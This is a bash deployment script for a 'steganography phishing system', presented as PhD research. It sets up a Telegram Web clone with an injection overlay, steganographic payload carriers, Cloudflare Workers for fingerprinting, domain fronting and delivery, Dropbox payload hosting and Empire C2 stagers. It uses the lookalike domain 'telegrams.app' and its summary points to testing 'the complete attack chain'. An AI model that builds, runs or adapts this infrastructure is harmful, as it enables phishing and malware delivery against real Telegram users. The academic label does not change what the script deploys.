#!/bin/bash

# Advanced Steganography Phishing System - Deployment Script
# PhD Research Project - Copenhagen University

set -e

echo "🎯 Advanced Steganography Phishing System Deployment"
echo "=================================================="

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
PROJECT_NAME="advanced-steganography-phishing"
GITHUB_REPO="nikeiswrong/advanced-steganography-phishing"
DOMAIN="telegrams.app"

# Functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

check_dependencies() {
    log_info "Checking dependencies..."
    
    # Check Python
    if ! command -v python3 &> /dev/null; then
        log_error "Python 3 is required"
        exit 1
    fi
    
    # Check steghide
    if ! command -v steghide &> /dev/null; then
        log_warning "Installing steghide..."
        sudo apt update && sudo apt install -y steghide
    fi
    
    # Check Node.js
    if ! command -v node &> /dev/null; then
        log_warning "Node.js not found, install manually if needed"
    fi
    
    # Check git
    if ! command -v git &> /dev/null; then
        log_error "Git is required"
        exit 1
    fi
    
    log_success "Dependencies checked"
}

setup_python_env() {
    log_info "Setting up Python environment..."
    
    # Install Python requirements
    if [ -f "requirements.txt" ]; then
        pip3 install -r requirements.txt
        log_success "Python packages installed"
    else
        log_warning "requirements.txt not found, installing basic packages"
        pip3 install pillow numpy requests
    fi
}

create_directory_structure() {
    log_info "Creating directory structure..."
    
    mkdir -p {workers,telegram-clone,steganography,empire-stagers,deployment,tests}
    mkdir -p large-stego-images stego-output
    
    log_success "Directory structure created"
}

generate_steganography_images() {
    log_info "Generating steganography carrier images..."
    
    if [ -f "large-stego-system.py" ]; then
        python3 large-stego-system.py create
        log_success "Carrier images generated"
    else
        log_warning "large-stego-system.py not found, skipping image generation"
    fi
}

setup_git_repo() {
    log_info "Setting up Git repository..."
    
    # Initialize git if not already
    if [ ! -d ".git" ]; then
        git init
        log_info "Git repository initialized"
    fi
    
    # Add files
    git add .
    git commit -m "Initial commit: Advanced Steganography Phishing System

- Complete steganography payload embedding system
- Cloudflare Workers for domain fronting and delivery
- Telegram Web interface clone with injection overlay
- Empire C2 stager integration
- Multi-layer evasion and anti-analysis
- Academic research framework

Research Context: PhD Criminology - Copenhagen University
Purpose: Advanced Persistent Threat Methodology Analysis"
    
    log_success "Git repository configured"
}

push_to_github() {
    log_info "Pushing to GitHub..."
    
    # Check if remote exists
    if ! git remote get-url origin &> /dev/null; then
        log_info "Adding GitHub remote..."
        git remote add origin "https://github.com/${GITHUB_REPO}.git"
    fi
    
    # Push to GitHub
    git branch -M main
    git push -u origin main
    
    log_success "Pushed to GitHub: https://github.com/${GITHUB_REPO}"
}

create_documentation() {
    log_info "Creating additional documentation..."
    
    # Create deployment guide
    cat > deployment/DEPLOYMENT.md << 'EOF'
# Deployment Guide

## Prerequisites
1. Cloudflare account with API token
2. Domain configured in Cloudflare
3. Dropbox developer app
4. Empire C2 server (optional)

## Step-by-Step Deployment

### 1. Environment Setup
```bash
export CF_API_TOKEN="your_cloudflare_token"
export CF_ZONE_ID="your_zone_id"
export DROPBOX_TOKEN="your_dropbox_token"
```

### 2. Generate Carriers
```bash
python3 large-stego-system.py create
```

### 3. Embed Payloads
```bash
python3 large-stego-system.py process
```

### 4. Deploy Workers
```bash
wrangler deploy telegram-fingerprint-worker.js
wrangler deploy telegram-delivery-worker.js
```

### 5. Upload Images
```bash
./stego-output/upload_large_images.sh
```

## Verification
- Test fingerprinting: `curl -H "User-Agent: Telegram Desktop" https://your-domain.com/api/check`
- Verify payload extraction: `node test-extraction.js`
- Check telemetry: Monitor Cloudflare Analytics
EOF
    
    log_success "Documentation created"
}

display_summary() {
    echo ""
    echo "🎉 Deployment Complete!"
    echo "====================="
    echo ""
    echo "📁 GitHub Repository: https://github.com/${GITHUB_REPO}"
    echo "🌐 Domain: https://${DOMAIN}"
    echo "📚 Documentation: See README.md and deployment/"
    echo ""
    echo "🔧 Next Steps:"
    echo "1. Configure Cloudflare Workers with your API tokens"
    echo "2. Set up Dropbox integration for payload hosting"
    echo "3. Deploy Empire C2 server (optional)"
    echo "4. Test the complete attack chain"
    echo ""
    echo "⚠️  Academic Research Only - Use Responsibly"
    echo ""
}

# Main execution
main() {
    log_info "Starting deployment process..."
    
    check_dependencies
    setup_python_env
    create_directory_structure
    create_documentation
    
    log_info "Generating steganography images (this may take a few minutes)..."
    generate_steganography_images
    
    setup_git_repo
    
    # Ask before pushing to GitHub
    echo ""
    read -p "Push to GitHub? (y/n): " -n 1 -r
    echo ""
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        push_to_github
    else
        log_info "Skipping GitHub push. You can run 'git push -u origin main' later."
    fi
    
    display_summary
}

# Check if script is being run directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi